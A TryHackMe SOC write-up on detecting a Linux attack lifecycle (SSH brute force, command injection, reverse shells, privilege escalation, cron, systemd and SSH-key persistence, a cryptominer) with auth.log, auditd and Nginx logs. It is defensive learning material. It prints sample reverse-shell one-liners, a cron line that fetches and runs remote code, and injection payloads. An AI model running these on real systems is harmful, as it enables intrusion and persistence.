# 🐧 TryHackMe: Linux Logging & Threat Detection — Full Attack Lifecycle Writeup

**Platform:** TryHackMe  
**Difficulty:** Intermediate  
**Tools Used:** auditd (ausearch), auth.log, Bash history, Nginx access logs  
**Rooms Covered:** Linux Logging for SOC · Linux Threat Detection 1 · Linux Threat Detection 2 · Linux Threat Detection 3  
**MITRE ATT&CK Tactics:** Initial Access · Discovery · Collection · Ingress Tool Transfer · C2 · Privilege Escalation · Persistence · Impact

---

## Overview

Four-room series covering Linux threat detection from the ground up — starting with log sources and working through a complete attack lifecycle. Investigated SSH brute force, web application exploitation, command injection, reverse shells, privilege escalation, cryptominer deployment, and five distinct Linux persistence mechanisms. All detection work was performed using native Linux log sources: `/var/log/auth.log`, auditd (`ausearch`), Nginx access logs, and Bash history — mirroring real-world SOC workflows without GUI tooling.

---

## Skills Demonstrated

- Reading and filtering Linux authentication, syslog, and package manager logs using `grep` and `cat`
- Detecting SSH brute force and breach via `/var/log/auth.log`
- Identifying user management events (useradd, usermod, passwd) in authentication logs
- Building process trees using auditd `ppid`/`pid` chaining to trace attack origin
- Detecting web application exploitation via Nginx access log analysis
- Identifying reverse shells, privilege escalation, and ingress tool transfer through auditd
- Uncovering cron, systemd, new user, and SSH key persistence techniques
- Analyzing a real-world Dota3 cryptominer infection end-to-end

---

## Linux Log Sources Overview

| Log Source | Location | SOC Use Case |
|-----------|----------|-------------|
| Authentication log | `/var/log/auth.log` | SSH logins, sudo commands, user management |
| Syslog | `/var/log/syslog` | General system events, cron, kernel messages |
| Package manager | `/var/log/dpkg.log` | Software installs/updates — attacker tooling |
| Web server | `/var/log/nginx/access.log` | Web attacks, command injection, exploit attempts |
| Bash history | `~/.bash_history` | Ad-hoc attacker commands (unreliable — can be bypassed) |
| Auditd | `/var/log/audit/audit.log` | Runtime process creation, file changes, network events |

> Unlike Windows, Linux has no built-in equivalent to Sysmon. **Auditd** fills this role — monitoring system calls to log process creation, file access, and network connections. All detection in targeted investigations relied on `ausearch`.

---

## Stage 1: Initial Access

### SSH Brute Force & Breach (T1110 / T1133)

Filtered auth.log for failed and successful SSH authentication to surface brute force patterns and the eventual breach.

```bash
# Surface all failed SSH attempts
cat /var/log/auth.log | grep "sshd" | grep "Failed"

# Surface all successful logins
cat /var/log/auth.log | grep "sshd" | grep "Accepted"
```

**Key indicators:**
- High volume of `Failed password` entries from a single external IP in a short window
- Successful `Accepted password` from an untrusted external IP following failed attempts
- Password-based auth from an external IP is always suspicious; key-based from internal IPs is expected

**Findings from lab investigation:**
- SSH brute force began: `2025-08-21`
- Four targeted usernames: `root, roy, sol, user`
- IP that successfully breached root: `91.224.92.79`

---

### Web Application Exploitation (T1190)

Detected command injection in a vulnerable web application (`TryPingMe`) via Nginx access log analysis. The attacker probed with Linux commands in the query parameter instead of IP addresses — a clear injection attempt.

```bash
cat /var/log/nginx/access.log
# Attacker progression visible in request parameters:
# /ping?host=whoami    → HTTP 500 (rejected)
# /ping?host=;whoami   → HTTP 200 (injected successfully)
# /ping?host=;ls       → HTTP 200 (continued enumeration)
```

**Key indicators:**
- Non-IP values in parameters designed for IP input
- HTTP 500 followed by HTTP 200 for same endpoint — attacker testing injection syntax
- Requests for internal file paths: `/opt/trypingme/main.py`

**Process tree confirmation with auditd:**

Web exploitation leaves little trace in auth.log but auditd process trees confirm the origin:
```
/usr/bin/python3 /opt/trypingme/main.py  (PID 577)
  → /bin/sh -c ;whoami                   (PPID 577)
    → whoami                             (PPID 1018)
```

Suspicious `whoami` PPID: `1018` → traced back to TryPingMe app PID: `577`

---

## Stage 2: Discovery (T1082 / T1033 / T1057 / T1518)

Post-breach discovery is detected as a burst of short-lived process creation events traced back to a suspicious parent — the same process tree approach used in Windows threat detection.

**Common discovery command pattern:**
```bash
# Identity and system
whoami; id; uname -a; hostname; uname -m

# Users and sessions
w; last; cat /etc/passwd; cat /etc/sudoers

# Processes and network
ps aux; ss -tnlp; ip a; ip r; arp -a

# Security tool detection
ps aux | egrep "ds_agent,falcon,sentinel"
systemd-detect-virt   # Identifies cloud/VM environment (returned: Amazon)

# Cryptominer-specific (indicates miner motivation)
cat /proc/cpuinfo; lscpu | grep Model; free -m
```

**Lab finding:** Script at `/home/itsupport/debug.sh` was the origin of a discovery command spike — traced via auditd PID chaining from `hostname` back to the script. Author email embedded in script: `greg@tryhackme.thm`

**Dota3 cryptominer discovery sequence identified:**
- EDR processes checked with `egrep`: `ds_agent, falcon, sentinel`
- Last logged-in users checked with: `last`
- Brute force origin IP: `45.9.148.125`

---

## Stage 3: Ingress Tool Transfer (T1105)

Attackers download additional tools post-breach using pre-installed Linux utilities.

| Method | Command | Detection |
|--------|---------|-----------|
| wget | `wget https://... -O /tmp/file` | Auditd process creation (key: `proc_wget`) |
| curl | `curl --output /tmp/file https://...` | Auditd process creation |
| SCP (attacker → victim) | `scp attacker:/malware.sh /tmp/` | Auth.log SSH login event |
| SCP (victim → attacker) | `scp attacker:/file /tmp/` | Auditd process creation for `scp` |

> SCP transfers *from* the attacker to the victim only appear as an SSH login in auth.log — no process creation event on the victim. SCP initiated *by* the victim appears in auditd. This asymmetry is critical to understand.

**Lab findings:**
- Elastic agent downloaded from: `artifacts.elastic.co`
- Malicious helper script downloaded to: `/var/tmp/helper.sh`
- Dota3 malware archive transferred via SCP: `kernupd.tar.gz`

---

## Stage 4: Reverse Shells (T1059)

When Initial Access is through a web exploit rather than SSH, attackers establish a reverse shell to gain a proper interactive terminal.

**Common reverse shell methods:**
```bash
# Bash TCP reverse shell
bash -i >& /dev/tcp/10.10.10.10/1337 0>&1

# Socat reverse shell (more stable)
socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane

# Python reverse shell
python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'
```

**Detection with auditd process tree:**
```bash
ausearch -i -x socat                  # Find the reverse shell command
ausearch -i --pid <socat_ppid>        # Walk up to confirm origin (TryPingMe app)
ausearch -i --ppid <socat_pid>        # List all attacker commands post-shell
```

**Lab finding:** Reverse shell to `10.14.105.255` traced back to TryPingMe web app via process tree.

---

## Stage 5: Privilege Escalation (T1068 / T1548)

After gaining low-privilege access via a web exploit, attackers escalate to root. Detection relies on comparing the `uid` field before and after the escalation attempt in auditd logs.

**Detection pattern:**
```bash
ausearch -i -x <exploit-binary>       # uid=serviceuser before exploit
ausearch -i --ppid <exploit-pid>      # uid=root after — escalation confirmed
```

**Surrounding indicators that suggest privilege escalation is coming:**
- Spike of discovery commands from a non-administrative process
- Download of exploit code to `/tmp/` followed by `gcc` compilation
- `chmod +x` on a newly created binary in temp directories

**Lab findings:**
- Command used to search for credentials: `grep -iR pass .`
- Escalation command used: `su root`
- Root password found in `.env` file: `nGql1pQkGa`

---

## Stage 6: Persistence

### Cron Job Persistence (T1053.003)

Attackers add entries to cron files to execute malware on reboot or at intervals.

```bash
# Detection: monitor changes to cron files
ausearch -i -f /etc/cron.d
ausearch -i -x crontab

# Key cron paths to monitor
/etc/crontab
/etc/cron.d/*
/var/spool/cron/*
```

**Real-world example (Rocke cryptominer):**  
`*/10 * * * root (curl https://pastebin.com/raw/...) | sh` — redownloads every 10 minutes to survive cleanup.

---

### Systemd Service Persistence (T1543.003)

Attackers create malicious `.service` files disguised as legitimate system services.

```bash
# Detection: monitor systemd directories for new files
ausearch -i -f /etc/systemd
ausearch -i -f /lib/systemd
```

**Real-world example (Sandworm/GOGETTER):**  
Created `/lib/systemd/system/cloud-online.service` with description "Initial cloud-online job" to blend in.

---

### New User Account (T1136)

```bash
# Detection via auth.log
cat /var/log/auth.log | grep -E 'useradd|usermod'
```

**Lab finding:** User `koichi` created and added to `sudo` group.

---

### SSH Key Backdoor (T1098.004)

Attackers append their public key to `~/.ssh/authorized_keys` for persistent keyless SSH access.

```bash
# Detection: monitor authorized_keys files for changes
ausearch -i -f /.ssh/authorized_keys
```

> Note: `echo [key] >> ~/.ssh/authorized_keys` is a shell builtin and won't appear as `echo` in auditd — it logs as `bash`. File event monitoring is more reliable than process monitoring for this technique.

**Lab finding:** `/root/.ssh/authorized_keys` was modified to add backdoor SSH key.

---

## Stage 7: Impact — Dota3 Cryptominer Case Study

Complete end-to-end reconstruction of a real-world cryptominer infection:

| Step | Action | Detection Method |
|------|--------|-----------------|
| 1 | Botnet brute-forces exposed SSH across 2,000+ IPs | Auth.log: `Accepted password` from external IP after `Failed password` flood |
| 2 | Discovery: CPU/RAM queries, EDR check, last users | Auditd: burst of `lscpu`, `free`, `egrep` from SSH session |
| 3 | Password changed, SSH keys replaced with attacker's | Auth.log: `passwd` event; Auditd: `authorized_keys` file write |
| 4 | Malware archive transferred via SCP | Auth.log: SSH login; Auditd: `scp` process creation |
| 5 | Archive unpacked to hidden `/tmp/.apt/` directory | Auditd: `tar` creating files in `/tmp` |
| 6 | Internal network scanned for new SSH victims | Network traffic: port 22 scan across `10.10.12.1-10.10.12.10` |
| 7 | Cryptominer launched with `nohup` | Auditd: `nohup /tmp/.apt/kernupd/kernupd` |

---

## Auditd Process Tree — Core Detection Workflow

The universal detection approach across all Linux threat stages:

```bash
# Step 1: Find the suspicious command
ausearch -i -x <command>

# Step 2: Walk up the tree to find its origin
ausearch -i --pid <ppid_from_step1>

# Step 3: List all sibling commands from the same parent
ausearch -i --ppid <parent_pid> | grep proctitle

# Step 4: Repeat until you reach PID 1 (init) or a known-good process
```

**Key auditd fields:**

| Field | Meaning |
|-------|---------|
| `pid` | Process ID of this event |
| `ppid` | Parent Process ID — used to walk the tree |
| `auid` | Original login user (survives `sudo`/`su` switches) |
| `uid` | Effective user running the command |
| `exe` | Absolute path to the binary |
| `tty` | Session identifier — distinguishes concurrent users |
| `key` | Custom auditd rule tag for filtered searching |

---

## MITRE ATT&CK Coverage

| Tactic | Technique | Detection Source |
|--------|-----------|-----------------|
| Initial Access | T1110 SSH Brute Force | auth.log: Failed/Accepted password |
| Initial Access | T1190 Web App Exploit | Nginx access.log; auditd process tree |
| Discovery | T1082/T1033/T1057 | Auditd: burst of recon commands from suspicious parent |
| Ingress Transfer | T1105 | Auditd: wget/curl/scp; auth.log SSH login |
| C2 | T1059 Reverse Shell | Auditd: socat/bash/python3 outbound connection |
| Privilege Escalation | T1068/T1548 | Auditd: uid change before/after exploit binary |
| Persistence | T1053.003 Cron | Auditd: file write to cron paths |
| Persistence | T1543.003 Systemd | Auditd: file write to systemd paths |
| Persistence | T1136 New User | auth.log: useradd/usermod events |
| Persistence | T1098.004 SSH Keys | Auditd: authorized_keys file modification |
| Impact | T1496 Cryptomining | Auditd: XMRig binary execution; network: port scans |

---

## Key Takeaways

- Linux log analysis is less structured than Windows but often contains enough detail to fully reconstruct an attack — the key is knowing which files to grep and which auditd keys to query
- `whoami` is one of the most reliable early-breach indicators on Linux; legitimate applications almost never need to run it
- Process tree analysis via auditd `ppid`/`pid` chaining is the single most universal detection technique across all Linux attack stages — the same approach works for web exploits, SSH breaches, and supply chain attacks
- Bash history is unreliable for SOC — attackers can bypass it with a leading space, a different shell, or by running scripts; auditd is always preferred
- Linux persistence is diverse; monitoring file writes to cron paths, systemd directories, and `authorized_keys` files covers the majority of real-world cases
- Linux servers are increasingly targeted as entry points into Windows-dominated enterprise networks — a compromised Linux hypervisor can expose every Windows VM in the environment

---

*Part of an ongoing TryHackMe SOC Analyst learning path | Tools: auditd, auth.log, Nginx logs | Frameworks: MITRE ATT&CK*
